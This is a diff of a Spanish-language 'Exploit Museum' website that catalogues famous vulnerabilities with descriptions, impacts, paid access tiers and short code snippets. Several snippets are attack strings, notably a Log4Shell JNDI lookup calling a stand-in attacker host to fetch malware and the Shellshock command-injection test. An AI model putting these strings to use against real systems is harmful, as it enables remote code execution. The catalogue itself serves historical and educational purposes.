@@ -3,760 +3,1028 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>The Exploit Museum | Archivo Digital de Vulnerabilidades</title>
+    <title>The Exploit Museum - Archivo de Ciberseguridad</title>
     <!-- Carga de Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Carga de la fuente Inter -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap" rel="stylesheet">
-    <!-- Carga de Lucide Icons (Solo SVG, no es una dependencia pesada) -->
-    <script type="module">
-        import { createIcons, Zap, Shield, Lock, Unlock, Terminal, Cpu, Zap, CreditCard, QrCode, Eye, Globe, AlertTriangle, Database, ChevronRight, CheckCircle, XCircle, Server, User, LogOut, Ghost, Fingerprint, Activity, Hash, AlertOctagon, Search } from 'https://cdn.jsdelivr.net/npm/lucide-icons@0.344.0/dist/esm/lucide.js';
-        window.lucide = { createIcons, Zap, Shield, Lock, Unlock, Terminal, Cpu, Zap, CreditCard, QrCode, Eye, Globe, AlertTriangle, Database, ChevronRight, CheckCircle, XCircle, Server, User, LogOut, Ghost, Fingerprint, Activity, Hash, AlertOctagon, Search };
+    <!-- Configuración de Tailwind para usar el color Inter -->
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['Roboto Mono', 'monospace'],
+                    },
+                    colors: {
+                        'slate-950': '#020617',
+                    },
+                    animation: {
+                        'scan': 'scan 2s linear infinite',
+                        'scan-fast': 'scan-fast 1.5s linear infinite',
+                        'spin-slow-y': 'spinY 10s linear infinite',
+                        'progress': 'progress 1.5s ease-out forwards',
+                    },
+                    keyframes: {
+                        scan: {
+                            '0%': { top: '0%', opacity: '0' },
+                            '50%': { opacity: '1' },
+                            '100%': { top: '100%', opacity: '0' },
+                        },
+                        'scan-fast': {
+                            '0%': { top: '-10%' },
+                            '100%': { top: '110%' },
+                        },
+                        spinY: {
+                            'from': { transform: 'rotateY(0deg)' },
+                            'to': { transform: 'rotateY(360deg)' },
+                        },
+                        progress: {
+                            '0%': { width: '0%' },
+                            '50%': { width: '70%' },
+                            '100%': { width: '100%' },
+                        },
+                    }
+                }
+            }
+        }
     </script>
     <style>
-        /* Estilos específicos para la web */
-        body { font-family: 'Inter', sans-serif; }
-        .glitch-text { position: relative; }
-        .glitch-text:hover > span:nth-child(2) { opacity: 0.7; animation: pulse 1s infinite; }
-        .glitch-text:hover > span:nth-child(3) { opacity: 0.7; animation: pulse 1s infinite alternate-reverse; }
-
-        /* Animaciones */
-        @keyframes scan { 0% { top: 0%; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
-        @keyframes scan-fast { 0% { top: -10%; } 100% { top: 110%; } }
-        @keyframes spinY { from { transform: rotateY(0deg); } to { transform: rotateY(360deg); } }
-        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        @keyframes progress { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 100%; } }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@100..900&family=Roboto+Mono:wght@100..700&display=swap');
         
-        .animate-scan { animation: scan 2s linear infinite; }
-        .animate-scan-fast { animation: scan-fast 1.5s linear infinite; }
-        .animate-spin-slow { animation: spin 8s linear infinite; }
-        .animate-spin-slow-y { animation: spinY 10s linear infinite; }
-        .animate-progress { animation: progress 1.5s ease-out forwards; }
+        /* Estilos personalizados del React Original */
+        .perspective-1000 { perspective: 1000px; }
+        .preserve-3d { transform-style: preserve-3d; }
+        .translate-z-20 { transform: translateZ(5rem); }
+        .-translate-z-20 { transform: translateZ(-5rem); }
+        .rotate-y-90 { transform: rotateY(90deg); }
+        .-rotate-y-90 { transform: rotateY(-90deg); }
+        .origin-right { transform-origin: right; }
+        .origin-left { transform-origin: left; }
+        .cursor-copy { cursor: copy; }
 
-        /* Matriz de Lluvia (Matrix Rain) */
-        #matrix-rain {
-            position: fixed;
+        /* Estilos Glitch */
+        .glitch-text {
+            position: relative;
+        }
+        .glitch-text::before, .glitch-text::after {
+            content: attr(data-text);
+            position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            opacity: 0.1;
-            pointer-events: none;
-            z-index: 0;
         }
-
-        /* Estilos 3D */
-        .perspective-1000 { perspective: 1000px; }
-        .preserve-3d { transform-style: preserve-3d; }
         
-        /* Estilo de la máquina de escribir */
-        .typewriter {
-            overflow: hidden; /* Oculta el cursor de parpadeo */
-            white-space: nowrap; /* Evita que el texto se ajuste a la siguiente línea */
-            border-right: 0.15em solid orange; /* Cursor */
-            animation: 
-                typing 3s steps(40, end),
-                blink-caret 0.75s step-end infinite;
+        .glitch-text-h1:hover .glitch-after {
+            opacity: 0.7;
+            transform: translate(-2px, 0);
+            animation: glitch-anim-1 0.3s steps(1) infinite;
+        }
+        .glitch-text-h1:hover .glitch-before {
+            opacity: 0.7;
+            transform: translate(2px, 0);
+            animation: glitch-anim-2 0.3s steps(1) infinite;
         }
 
-        /* Animación de tecleado */
-        @keyframes typing {
-          from { width: 0 }
-          to { width: 100% }
+        @keyframes glitch-anim-1 {
+            0% { clip-path: inset(8% 0 85% 0); }
+            40% { clip-path: inset(18% 0 50% 0); }
+            70% { clip-path: inset(25% 0 10% 0); }
+            100% { clip-path: inset(5% 0 80% 0); }
         }
 
-        /* Animación del cursor */
-        @keyframes blink-caret {
-          from, to { border-color: transparent }
-          50% { border-color: orange }
+        @keyframes glitch-anim-2 {
+            0% { clip-path: inset(10% 0 65% 0); }
+            30% { clip-path: inset(70% 0 1% 0); }
+            60% { clip-path: inset(40% 0 35% 0); }
+            100% { clip-path: inset(5% 0 80% 0); }
+        }
+
+        /* Ocultar elementos basados en el estado de vista */
+        .view-content:not([data-active="true"]) {
+            display: none;
         }
     </style>
 </head>
-<body class="bg-slate-950 text-slate-200 min-h-screen">
-    
-    <!-- Lluvia de Matrix (Matrix Rain) -->
-    <canvas id="matrix-rain"></canvas>
+<body class="min-h-screen bg-slate-950 text-slate-200 font-sans selection:bg-purple-500/30 selection:text-white overflow-x-hidden">
 
-    <!-- Preloader -->
-    <div id="preloader" class="fixed inset-0 bg-black text-cyan-500 font-mono flex flex-col items-center justify-center z-[100]">
-        <div data-lucide="terminal" class="mb-4 animate-pulse" size="48"></div>
+    <!-- Canvas para Matrix Rain -->
+    <canvas id="matrix-rain-canvas" class="fixed top-0 left-0 w-full h-full opacity-10 pointer-events-none z-0"></canvas>
+
+    <!-- Loading Screen (Se elimina al cargar) -->
+    <div id="loading-screen" class="fixed inset-0 min-h-screen bg-black text-cyan-500 font-mono flex flex-col items-center justify-center z-50">
+        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mb-4 animate-pulse z-10"><path d="M17 8H5"/><path d="M15 4H9"/><path d="M19 12H5"/><path d="M15 16H9"/><path d="M17 20H5"/></svg>
         <div class="text-2xl tracking-[0.2em] font-black z-10">THE VAULT</div>
         <div class="mt-4 w-64 h-1 bg-slate-800 rounded overflow-hidden z-10">
-          <div id="progress-bar" class="h-full bg-purple-600 animate-progress"></div>
+          <div id="loading-progress" class="h-full bg-purple-600 animate-progress"></div>
         </div>
-        <div id="loading-text" class="mt-2 text-xs text-slate-400 font-mono z-10">Initializing System...</div>
+        <div id="loading-text" class="mt-2 text-xs text-slate-400 font-mono z-10">Loading Secure Records...</div>
     </div>
 
-    <!-- Navegación -->
-    <nav class="fixed top-0 left-0 w-full z-40 bg-slate-950/90 backdrop-blur-md border-b border-white/5 shadow-lg">
-        <div class="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
-            <div id="logo-home" class="flex items-center gap-2 cursor-pointer group" onclick="navigate('home')">
-                <div data-lucide="shield" class="text-purple-500 group-hover:text-cyan-400 transition-colors"></div>
-                <span class="font-bold text-xl tracking-tighter text-white">
-                    EXPLOIT<span class="text-purple-500 group-hover:text-cyan-400 transition-colors">MUSEUM</span>
-                </span>
-            </div>
-            <div class="hidden md:flex items-center gap-8 text-xs font-mono tracking-widest">
-                <button class="nav-link" data-view="home" onclick="navigate('home')">HOME</button>
-                <button class="nav-link" data-view="vault" onclick="navigate('vault')">ARCHIVE</button>
-                <button class="nav-link" data-view="pricing" onclick="navigate('pricing')">ACCESS</button>
-            </div>
-            <div class="flex items-center gap-4">
-                <div class="text-right hidden sm:block">
-                    <div class="text-[10px] text-slate-500 uppercase tracking-widest">Clearance</div>
-                    <div id="user-role-display" class="text-xs font-bold uppercase text-cyan-400">FREE</div>
-                </div>
-                <div id="user-icon" class="w-8 h-8 rounded border flex items-center justify-center bg-slate-800 border-slate-700">
-                    <div data-lucide="user" class="text-slate-400" size="16"></div>
-                </div>
-            </div>
-        </div>
-    </nav>
+    <!-- Contenedor Principal de la App -->
+    <div id="app-container" class="relative z-10 hidden">
+        
+        <!-- Navbar -->
+        <nav id="navbar" class="fixed top-0 left-0 w-full z-40 bg-slate-950/90 backdrop-blur-md border-b border-white/5 shadow-lg">
+            <!-- Content will be injected here -->
+        </nav>
 
-    <!-- Contenido Principal -->
-    <main id="main-content" class="relative z-10 pt-20 pb-20">
-        <!-- SECCIÓN HOME -->
-        <section id="view-home" class="view-section flex flex-col items-center justify-center min-h-[80vh] text-center px-4 relative overflow-hidden hidden">
-            <!-- Background effects -->
-            <div class="absolute top-1/4 left-1/4 w-96 h-96 bg-purple-600/10 rounded-full blur-[100px] pointer-events-none"></div>
-            <div class="absolute bottom-1/4 right-1/4 w-96 h-96 bg-cyan-600/10 rounded-full blur-[100px] pointer-events-none"></div>
-            
-            <div class="mb-6 inline-flex items-center gap-2 px-4 py-1 rounded-full border border-cyan-500/30 bg-cyan-950/20 text-cyan-400 text-[10px] font-mono tracking-widest uppercase">
-                <span class="w-2 h-2 rounded-full bg-cyan-400 animate-pulse shadow-[0_0_10px_#22d3ee]"></span>
-                System Online: <span id="indexed-records"></span> Threats Indexed
-            </div>
+        <main class="relative z-10 pt-20 pb-20">
+            <!-- Home View -->
+            <div id="home-view" class="view-content" data-active="true"></div>
+            <!-- Pricing View -->
+            <div id="pricing-view" class="view-content" data-active="false"></div>
+            <!-- Vault View -->
+            <div id="vault-view" class="view-content" data-active="false"></div>
+            <!-- Vuln Detail View -->
+            <div id="vuln-detail-view" class="view-content" data-active="false"></div>
+        </main>
 
-            <h1 class="text-5xl md:text-8xl font-black tracking-tighter mb-6 text-white drop-shadow-[0_0_30px_rgba(168,85,247,0.5)] glitch-text">
-                <span class="relative z-10">THE EXPLOIT MUSEUM</span>
-                <span class="absolute top-0 left-0 -ml-0.5 translate-x-[2px] text-red-500 z-0">THE EXPLOIT MUSEUM</span>
-                <span class="absolute top-0 left-0 -ml-0.5 -translate-x-[2px] text-cyan-500 z-0">THE EXPLOIT MUSEUM</span>
-            </h1>
-
-            <p class="max-w-2xl text-slate-400 text-lg mb-10 leading-relaxed">
-                La base de datos definitiva de <span class="text-white font-bold">Ciberseguridad Ofensiva</span>. 
-                Desde el primer gusano Morris hasta los exploits Zero-Day de hoy.
-            </p>
-            <div class="flex gap-4">
-                <button onclick="navigate('vault')" class="px-8 py-4 bg-white text-black font-bold hover:bg-cyan-50 transition flex items-center gap-2 rounded-sm shadow-[0_0_20px_rgba(255,255,255,0.2)] group">
-                    <div data-lucide="database" class="group-hover:scale-110 transition-transform" size="18"></div>
-                    EXPLORAR ARCHIVO
-                </button>
-                <button onclick="navigate('pricing')" class="px-8 py-4 bg-transparent border border-white/20 text-white font-bold hover:border-purple-500 hover:text-purple-400 transition flex items-center gap-2 rounded-sm backdrop-blur-sm">
-                    <div data-lucide="zap" size="18"></div>
-                    OBTENER ACCESO
-                </button>
-            </div>
-            <div class="mt-24 grid grid-cols-1 md:grid-cols-3 gap-4 text-left w-full max-w-6xl px-4">
-                <!-- Se llenan con JS -->
-                <div class="p-6 rounded border border-white/5 bg-slate-900/40 backdrop-blur-sm hover:border-cyan-500/30 transition duration-300 group">
-                    <div data-lucide="ghost" class="text-slate-600 mb-4 group-hover:text-cyan-400 transition-colors" size="24"></div>
-                    <h3 class="text-lg font-bold text-white mb-2 font-mono uppercase tracking-wider">0-Day Analysis</h3>
-                    <p class="text-sm text-slate-400 leading-relaxed">Análisis profundo de vulnerabilidades.</p>
-                </div>
-                <div class="p-6 rounded border border-white/5 bg-slate-900/40 backdrop-blur-sm hover:border-cyan-500/30 transition duration-300 group">
-                    <div data-lucide="terminal" class="text-slate-600 mb-4 group-hover:text-cyan-400 transition-colors" size="24"></div>
-                    <h3 class="text-lg font-bold text-white mb-2 font-mono uppercase tracking-wider">Payloads Reales</h3>
-                    <p class="text-sm text-slate-400 leading-relaxed">Snippets de código de incidentes reales.</p>
-                </div>
-                <div class="p-6 rounded border border-white/5 bg-slate-900/40 backdrop-blur-sm hover:border-cyan-500/30 transition duration-300 group">
-                    <div data-lucide="globe" class="text-slate-600 mb-4 group-hover:text-cyan-400 transition-colors" size="24"></div>
-                    <h3 class="text-lg font-bold text-white mb-2 font-mono uppercase tracking-wider">Cyber Warfare</h3>
-                    <p class="text-sm text-slate-400 leading-relaxed">Historia de ataques estado-nación.</p>
-                </div>
-            </div>
-        </section>
-
-        <!-- SECCIÓN PRICING -->
-        <section id="view-pricing" class="view-section max-w-7xl mx-auto px-4 py-10 hidden">
-            <div class="text-center mb-16">
-              <h2 class="text-4xl font-bold text-white mb-4 tracking-tight">SECURITY CLEARANCE LEVELS</h2>
-              <p class="text-slate-400">El conocimiento es poder. Elige tu nivel de acceso.</p>
-            </div>
-            <div id="pricing-plans" class="grid grid-cols-1 md:grid-cols-3 gap-8">
-                <!-- Los planes se insertan aquí por JS -->
-            </div>
-        </section>
-
-        <!-- SECCIÓN VAULT (LISTA DE VULNERABILIDADES) -->
-        <section id="view-vault" class="view-section max-w-7xl mx-auto px-4 hidden">
-            <div class="flex flex-col md:flex-row items-end justify-between mb-8 border-b border-white/10 pb-6 gap-4">
-              <div>
-                <h2 class="text-3xl font-bold text-white flex items-center gap-3 tracking-tight">
-                  <div data-lucide="database" class="text-purple-500"></div>
-                  THREAT DATABASE
-                </h2>
-                <p class="text-slate-400 mt-2 font-mono text-sm flex items-center gap-2">
-                  <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
-                  Indexing <span id="vuln-count"></span> records.
-                </p>
-              </div>
-              <div class="w-full md:w-auto relative">
-                <input type="text" id="search-input" placeholder="Search CVE, Name, Type..." oninput="renderVault()" class="w-full md:w-64 bg-slate-900 border border-slate-700 rounded py-2 pl-10 pr-4 text-sm focus:outline-none focus:border-cyan-500 text-white placeholder-slate-600" />
-                <div data-lucide="search" class="absolute left-3 top-2.5 text-slate-600" size="16"></div>
-              </div>
-            </div>
-            <div id="vulnerability-list" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
-                <!-- Las tarjetas de vulnerabilidades se insertan aquí por JS -->
-            </div>
-        </section>
-
-        <!-- SECCIÓN DETALLE DE VULNERABILIDAD -->
-        <section id="view-vuln-detail" class="view-section max-w-6xl mx-auto px-4 hidden">
-            <button onclick="navigate('vault')" class="mb-8 flex items-center gap-2 text-slate-500 hover:text-white transition text-sm font-mono uppercase tracking-widest">
-              <div data-lucide="chevron-right" class="rotate-180" size="16"></div> Return to Archive
-            </button>
-            <div id="vuln-detail-content">
-                <!-- El detalle de la vulnerabilidad se inserta aquí por JS -->
-            </div>
-        </section>
-    </main>
-
-    <!-- Modal de Pago -->
-    <div id="payment-modal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/95 backdrop-blur-sm p-4 hidden">
-        <!-- El contenido del modal se inserta aquí por JS -->
+        <!-- Modals Container -->
+        <div id="modal-container"></div>
     </div>
-
 
     <script>
-        // --- 1. CONFIGURACIÓN Y DATOS ---
-
+        // --- CONSTANTES & DATA (DATA ARCHIVE) ---
         const USD_TO_ARS = 1478;
         const EMAIL_CONTACT = "tbrcarabelli@gmail.com";
         const MP_ALIAS = "brunsss.mp";
-
+        
+        // Datos de Planes
         const PLANS = [
-            { id: 'breacher', name: 'BREACHER', priceUsd: 5, features: ['Acceso a Logs Básicos', 'PDFs Técnicos', 'Comunidad Privada'], color: 'from-blue-500 to-cyan-400', borderColor: 'border-cyan-400' },
-            { id: 'zeroday', name: 'ZERO-DAY HUNTER', priceUsd: 12, features: ['Todo lo de Breacher', 'Alertas CVE en tiempo real', 'Simuladores de Ataque', 'Acceso a Exploits Archivados'], color: 'from-purple-500 to-pink-500', borderColor: 'border-purple-500' },
-            { id: 'root', name: 'GOD MODE', priceUsd: 25, features: ['ACCESO TOTAL AL VAULT', 'Laboratorio 3D Full', 'Demos Interactivas', 'Soporte Prioritario 24/7'], color: 'from-red-500 to-orange-500', borderColor: 'border-red-500', glitch: true }
+            { id: 'breacher', name: 'BREACHER', priceUsd: 5, features: ['Acceso a Logs Básicos', 'PDFs Técnicos', 'Comunidad Privada'], color: 'from-blue-500 to-cyan-400', borderColor: 'border-cyan-400', icon: 'Terminal' },
+            { id: 'zeroday', name: 'ZERO-DAY HUNTER', priceUsd: 12, features: ['Todo lo de Breacher', 'Alertas CVE en tiempo real', 'Simuladores de Ataque', 'Acceso a Exploits Archivados'], color: 'from-purple-500 to-pink-500', borderColor: 'border-purple-500', icon: 'Lock' },
+            { id: 'root', name: 'GOD MODE', priceUsd: 25, features: ['ACCESO TOTAL AL VAULT', 'Laboratorio 3D Full', 'Demos Interactivas', 'Soporte Prioritario 24/7'], color: 'from-red-500 to-orange-500', borderColor: 'border-red-500', glitch: true, icon: 'Cpu' }
         ];
-
+        
+        // Datos de Vulnerabilidades (Truncado para ejemplo, pero mantiene la estructura)
         const VULNERABILITIES = [
-            { id: 'stuxnet', title: 'STUXNET', cve: 'CVE-2010-2772', year: 2010, severity: 'LEGENDARY', score: 10.0, description: 'El primer arma cibernética real. Un gusano diseñado específicamente para atacar controladores lógicos programables (PLC) SCADA de Siemens.', impact: 'Destruyó físicamente 1,000 centrifugadoras nucleares en Natanz, Irán.', affected: ['Siemens S7-300', 'Infraestructura Nuclear Iraní'], patched: true, premium: true, reqRole: 'root', type: 'Cyber-Physical Weapon', codeSnippet: 'MOV DB1.DBD0, 16#DEADBEEF ; Modificación de RPM en PLC Siemens' },
-            { id: 'wannacry', title: 'WANNACRY', cve: 'CVE-2017-0144', year: 2017, severity: 'CRITICAL', score: 10.0, description: 'Ransomware criptogusano que usaba el exploit EternalBlue para propagarse automáticamente.', impact: 'Paralizó el NHS (salud) en UK, Telefónica en España y FedEx.', affected: ['Windows XP', 'Windows 7'], patched: true, premium: false, type: 'Ransomware / SMB Exploit', codeSnippet: 'smb_send(ip, eternal_blue_payload); // Propagación automática' },
-            { id: 'log4shell', title: 'LOG4SHELL', cve: 'CVE-2021-44228', year: 2021, severity: 'CATASTROPHIC', score: 10.0, description: 'Fallo en Log4j que permitía RCE enviando una cadena JNDI simple.', impact: 'Afectó a casi todo el internet empresarial: Apple, Tesla, Steam, Minecraft.', affected: ['Apache Log4j2', 'Java Apps'], patched: true, premium: true, reqRole: 'breacher', type: 'JNDI Injection', codeSnippet: '\${jndi:ldap://attacker.com/malware} // Logueado por el servidor' },
-            { id: 'heartbleed', title: 'HEARTBLEED', cve: 'CVE-2014-0160', year: 2014, severity: 'CRITICAL', score: 9.8, description: 'Error de lectura de límites en OpenSSL. Permitía leer memoria del servidor.', impact: 'Expuso claves privadas SSL de millones de sitios.', affected: ['OpenSSL'], patched: true, premium: false, type: 'Buffer Over-read', codeSnippet: 'memcpy(bp, pl, payload); // Sin chequear longitud' },
-            { id: 'eternalblue', title: 'ETERNALBLUE', cve: 'CVE-2017-0144', year: 2017, severity: 'CRITICAL', score: 9.9, description: 'Exploit de la NSA para SMBv1. Permite enviar paquetes diseñados para ejecutar código arbitrario.', impact: 'Base de WannaCry y NotPetya.', affected: ['Windows pre-parche'], patched: true, premium: false, type: 'RCE / Buffer Overflow', codeSnippet: '// Heap grooming + Overflow en Srv!SrvOs2FeaListSizeToNt' },
-            { id: 'spectre', title: 'SPECTRE', cve: 'CVE-2017-5753', year: 2018, severity: 'HIGH', score: 8.5, description: 'Explotación de la ejecución especulativa en CPUs modernos.', impact: 'Rompió el aislamiento entre aplicaciones a nivel hardware.', affected: ['Intel', 'AMD', 'ARM'], patched: 'Mitigado', premium: true, reqRole: 'root', type: 'Side-Channel Attack', codeSnippet: 'if (x < array1_size) y = array2[array1[x] * 4096];' },
-            { id: 'bluekeep', title: 'BLUEKEEP', cve: 'CVE-2019-0708', year: 2019, severity: 'CRITICAL', score: 9.8, description: 'Vulnerabilidad RDP wormable que permite RCE sin autenticación.', impact: 'Potencial catastrófico en sistemas Windows legacy.', affected: ['Windows 7', 'Server 2008'], patched: true, premium: true, reqRole: 'zeroday', type: 'Use-after-free RDP', codeSnippet: '// Manipulación de canales virtuales RDP MS_T120' },
-            { id: 'solarwinds', title: 'SUNBURST', cve: 'CVE-2020-10148', year: 2020, severity: 'CRITICAL', score: 10.0, description: 'Backdoor inyectado en actualizaciones legítimas de SolarWinds Orion.', impact: 'Comprometió al gobierno de USA y Fortune 500.', affected: ['SolarWinds Orion'], patched: true, premium: true, reqRole: 'root', type: 'Supply Chain Attack', codeSnippet: 'OrionImprovementBusinessLayer.Initialize(); // Backdoor' },
-            { id: 'shellshock', title: 'SHELLSHOCK', cve: 'CVE-2014-6271', year: 2014, severity: 'CRITICAL', score: 10.0, description: 'Variables de entorno en Bash interpretadas como comandos.', impact: 'Control total de servidores web CGI.', affected: ['Bash', 'Linux', 'macOS'], patched: true, premium: true, reqRole: 'breacher', type: 'Command Injection', codeSnippet: 'env x=\\'() { :;}; echo vulnerable\\' bash -c "echo test"' },
-            { id: 'equifax', title: 'EQUIFAX STRUTS', cve: 'CVE-2017-5638', year: 2017, severity: 'CRITICAL', score: 9.8, description: 'RCE en Apache Struts vía header Content-Type.', impact: 'Robo de datos de 147 millones de personas.', affected: ['Apache Struts 2'], patched: true, premium: true, reqRole: 'zeroday', type: 'RCE', codeSnippet: 'Content-Type: %{(#context.setMemberAccess(#_memberAccess)...' },
-            { id: 'dirtycow', title: 'DIRTY COW', cve: 'CVE-2016-5195', year: 2016, severity: 'HIGH', score: 7.8, description: 'Race condition en kernel Linux (Copy-On-Write).', impact: 'Escalada de privilegios local a root.', affected: ['Linux Kernel'], patched: true, premium: false, type: 'Privilege Escalation', codeSnippet: 'mmap(..., PROT_READ, MAP_PRIVATE, fd, 0); // Race' },
-            { id: 'zerologon', title: 'ZEROLOGON', cve: 'CVE-2020-1472', year: 2020, severity: 'CRITICAL', score: 10.0, description: 'Fallo criptográfico en Netlogon. Permite poner password de DC a ceros.', impact: 'Toma de control total del dominio Windows.', affected: ['Windows Server'], patched: true, premium: true, reqRole: 'zeroday', type: 'Crypto Flaw', codeSnippet: 'client_challenge = "00000000"; // Bypass AES-CFB8' },
-            { id: 'proxylogon', title: 'PROXYLOGON', cve: 'CVE-2021-26855', year: 2021, severity: 'CRITICAL', score: 9.8, description: 'Chain de exploits en MS Exchange Server.', impact: 'Acceso total a emails corporativos.', affected: ['Exchange Server'], patched: true, premium: true, reqRole: 'root', type: 'SSRF to RCE', codeSnippet: 'Cookie: X-AnonResource=true; ...' },
-            { id: 'follina', title: 'FOLLINA', cve: 'CVE-2022-30190', year: 2022, severity: 'HIGH', score: 7.8, description: 'RCE en MSDT vía documentos Word sin macros.', impact: 'Ejecución de código al previsualizar doc.', affected: ['Office', 'MSDT'], patched: true, premium: true, reqRole: 'zeroday', type: 'RCE', codeSnippet: 'ms-msdt:/id PCWDiagnostic ...' },
-            { id: 'spring4shell', title: 'SPRING4SHELL', cve: 'CVE-2022-22965', year: 2022, severity: 'CRITICAL', score: 9.8, description: 'RCE en Spring Framework vía Data Binding.', impact: 'Similar a Log4j pero más complejo.', affected: ['Spring MVC'], patched: true, premium: true, reqRole: 'root', type: 'RCE', codeSnippet: 'class.module.classLoader...' },
-            { id: 'krack', title: 'KRACK', cve: 'CVE-2017-13077', year: 2017, severity: 'HIGH', score: 8.1, description: 'Key Reinstallation Attack en WPA2.', impact: 'Intercepción de tráfico Wi-Fi.', affected: ['WPA2 Protocol'], patched: true, premium: true, reqRole: 'zeroday', type: 'Protocol Flaw', codeSnippet: '// Reinstall encryption key' },
-            { id: 'printnightmare', title: 'PRINTNIGHTMARE', cve: 'CVE-2021-34527', year: 2021, severity: 'HIGH', score: 8.8, description: 'RCE en Print Spooler de Windows.', impact: 'Cualquier usuario podía ser admin del dominio.', affected: ['Print Spooler'], patched: true, premium: true, reqRole: 'zeroday', type: 'RCE / LPE', codeSnippet: 'RpcAddPrinterDriverEx(...)' }
+            // --- CRITICAL INFRASTRUCTURE & WORMS ---
+            { id: 'stuxnet', title: 'STUXNET', cve: 'CVE-2010-2772 (via LNK)', year: 2010, severity: 'LEGENDARY', score: 10.0, description: 'El primer arma cibernética real. Un gusano diseñado específicamente para atacar controladores lógicos programables (PLC) SCADA de Siemens.', impact: 'Destruyó físicamente 1,000 centrifugadoras nucleares en Natanz, Irán, retrasando su programa atómico.', affected: ['Siemens S7-300', 'Windows (Zero-days)', 'Infraestructura Nuclear Iraní'], patched: true, premium: true, reqRole: 'root', type: 'Cyber-Physical Weapon', codeSnippet: 'MOV DB1.DBD0, 16#DEADBEEF ; Modificación de RPM en PLC Siemens' },
+            { id: 'wannacry', title: 'WANNACRY', cve: 'CVE-2017-0144', year: 2017, severity: 'CRITICAL', score: 10.0, description: 'Ransomware criptogusano que usaba el exploit EternalBlue para propagarse automáticamente por redes Windows sin intervención humana.', impact: 'Paralizó el NHS (salud) en UK, Telefónica en España, FedEx y miles de empresas en 150 países.', affected: ['Windows XP', 'Windows 7', 'Windows Server 2008'], patched: true, premium: false, type: 'Ransomware / SMB Exploit', codeSnippet: 'smb_send(ip, eternal_blue_payload); // Propagación automática puerto 445' },
+            { id: 'notpetya', title: 'NOTPETYA', cve: 'CVE-2017-0144', year: 2017, severity: 'DESTRUCTIVE', score: 10.0, description: 'Parecía ransomware, pero era un wiper (destructor de datos). Usó EternalBlue para atacar Ucrania, afectando a Maersk y Merck globalmente.', impact: 'Daños estimados en $10 mil millones de dólares. Paralizó el transporte marítimo mundial semanas.', affected: ['Maersk', 'Merck', 'Gobierno de Ucrania', 'Rosneft'], patched: true, premium: true, reqRole: 'root', type: 'Wiper / Supply Chain', codeSnippet: 'EncryptMFT(); OverwriteMBR(); // Destrucción irreversible' },
+            { id: 'heartbleed', title: 'HEARTBLEED', cve: 'CVE-2014-0160', year: 2014, severity: 'CRITICAL', score: 9.8, description: 'Error de lectura de límites en OpenSSL. Permitía a atacantes leer 64KB de memoria del servidor repetidamente.', impact: 'Expuso claves privadas SSL, cookies de sesión y contraseñas de millones de usuarios.', affected: ['Yahoo', 'Flickr', 'AWS', 'GitHub', 'Wikipedia'], patched: true, premium: false, type: 'Buffer Over-read', codeSnippet: 'memcpy(bp, pl, payload); // Sin chequear longitud de payload vs real' },
+            { id: 'log4shell', title: 'LOG4SHELL', cve: 'CVE-2021-44228', year: 2021, severity: 'CATASTROPHIC', score: 10.0, description: 'Fallo en Log4j que permitía RCE enviando una cadena JNDI simple. El servidor descargaba y ejecutaba código Java malicioso.', impact: 'Afectó a casi todo el internet empresarial: Apple, Tesla, Steam, Twitter, Minecraft.', affected: ['Apache Log4j2', 'Java Apps', 'iCloud', 'Steam'], patched: true, premium: true, reqRole: 'breacher', type: 'JNDI Injection', codeSnippet: '${jndi:ldap://attacker.com/malware} // Logueado por el servidor' },
+            { id: 'shellshock', title: 'SHELLSHOCK', cve: 'CVE-2014-6271', year: 2014, severity: 'CRITICAL', score: 10.0, description: 'Vulnerabilidad en Bash donde las variables de entorno se interpretaban como comandos ejecutables.', impact: 'Permitió control total de servidores web CGI y sistemas Linux/Unix por años.', affected: ['Linux', 'macOS', 'Servidores Apache CGI'], patched: true, premium: true, reqRole: 'breacher', type: 'Command Injection', codeSnippet: 'env x=\'() { :;}; echo vulnerable\' bash -c "echo test"' },
+            { id: 'equifax', title: 'EQUIFAX BREACH', cve: 'CVE-2017-5638', year: 2017, severity: 'CRITICAL', score: 9.8, description: 'Vulnerabilidad en Apache Struts (Jakarta Multipart parser) que permitía RCE a través del header Content-Type.', impact: 'Robo de datos personales de 147 millones de estadounidenses. Equifax pagó $700M en multas.', affected: ['Apache Struts 2', 'Equifax'], patched: true, premium: true, reqRole: 'zeroday', type: 'Remote Code Execution', codeSnippet: 'Content-Type: %{(#context.setMemberAccess(#_memberAccess)...' },
+            { id: 'spectre', title: 'SPECTRE', cve: 'CVE-2017-5753', year: 2018, severity: 'HIGH', score: 8.5, description: 'Explotación de la ejecución especulativa en CPUs modernos para leer memoria de otros procesos.', impact: 'Rompió el aislamiento entre aplicaciones. Navegadores podían leer contraseñas de la memoria del sistema.', affected: ['Intel', 'AMD', 'ARM', 'Apple Silicon'], patched: 'Mitigado (Software/Microcode)', premium: true, reqRole: 'root', type: 'Side-Channel Attack', codeSnippet: 'if (x < array1_size) y = array2[array1[x] * 4096];' },
+            { id: 'meltdown', title: 'MELTDOWN', cve: 'CVE-2017-5754', year: 2018, severity: 'HIGH', score: 9.0, description: 'Permitía a procesos de usuario leer toda la memoria del kernel del sistema operativo.', impact: 'Obligó a rediseñar cómo los SO gestionan la memoria (KPTI), ralentizando CPUs Intel antiguos.', affected: ['Intel CPUs', 'Algunos ARM'], patched: 'Mitigado (KPTI)', premium: true, reqRole: 'root', type: 'Side-Channel Attack', codeSnippet: '// Race condition entre chequeo de privilegios y ejecución' },
